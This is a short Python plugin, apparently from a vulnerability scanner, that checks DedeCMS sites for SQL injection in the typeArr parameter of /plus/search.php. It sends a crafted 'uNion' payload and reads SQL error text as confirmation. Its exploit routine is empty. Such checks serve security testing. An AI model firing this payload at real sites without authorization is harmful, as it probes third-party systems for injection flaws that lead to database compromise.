# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class dedecms_search_typeArr_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'dedecms',
            'vuln_title':'dedecms_search_typeArr_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'dedecms /plus/search.php typeArr存在SQL注入，由于有的waf会拦截自行构造EXP。',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/plus/search.php?keyword=test&typeArr[%20uNion%20]=a"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if r"Error infos" in req.text and r"Error sql" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = dedecms_search_typeArr_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)